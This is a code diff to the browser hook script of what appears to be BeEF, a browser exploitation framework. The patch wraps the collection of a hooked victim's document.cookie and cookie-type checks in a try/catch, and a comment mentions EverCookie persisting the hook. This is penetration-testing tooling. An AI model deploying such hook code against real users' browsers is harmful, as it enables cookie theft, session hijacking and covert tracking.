@@ -2101,7 +2101,6 @@ beef.browser = {
         var browser_name = beef.browser.getBrowserName();
         var browser_version = beef.browser.getBrowserVersion();
         var browser_reported_name = beef.browser.getBrowserReportedName();
-        var cookies = document.cookie;
         var page_title = (document.title) ? document.title : "Unknown";
         var page_uri = document.location.href;
         var page_referrer = (document.referrer) ? document.referrer : "Unknown";
@@ -2129,13 +2128,24 @@ beef.browser = {
         var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
 		var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
 		var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
-        var has_session_cookies = (beef.browser.cookie.hasSessionCookies("cookie")) ? "Yes" : "No";
-        var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies("cookie")) ? "Yes" : "No";
+        try{
+            var cookies = document.cookie;
+            var has_session_cookies = (beef.browser.cookie.hasSessionCookies("cookie")) ? "Yes" : "No";
+            var has_persistent_cookies = (beef.browser.cookie.hasPersistentCookies("cookie")) ? "Yes" : "No";
+            if (cookies) details["Cookies"] = cookies;
+            if (has_session_cookies) details["hasSessionCookies"] = has_session_cookies;
+            if (has_persistent_cookies) details["hasPersistentCookies"] = has_persistent_cookies;
+        }catch(e){
+            // the hooked domain is using HttpOnly. EverCookie is persisting the BeEF hook in a different way,
+            // and there is no reason to read cookies at this point
+            details["Cookies"] = "Cookies can't be read. The hooked domain is most probably using HttpOnly.";
+            details["hasSessionCookies"] = "No";
+            details["hasPersistentCookies"] = "No";
+        }
 
         if (browser_name) details["BrowserName"] = browser_name;
         if (browser_version) details["BrowserVersion"] = browser_version;
         if (browser_reported_name) details["BrowserReportedName"] = browser_reported_name;
-        if (cookies) details["Cookies"] = cookies;
         if (page_title) details["PageTitle"] = page_title;
         if (page_uri) details["PageURI"] = page_uri;
         if (page_referrer) details["PageReferrer"] = page_referrer;
@@ -2161,8 +2171,6 @@ beef.browser = {
         if (has_silverlight) details['HasSilverlight'] = has_silverlight;
 		if (has_quicktime) details['HasQuickTime'] = has_quicktime;
 		if (has_realplayer) details['HasRealPlayer'] = has_realplayer;
-        if (has_session_cookies) details["hasSessionCookies"] = has_session_cookies;
-        if (has_persistent_cookies) details["hasPersistentCookies"] = has_persistent_cookies;
 
         return details;
     },
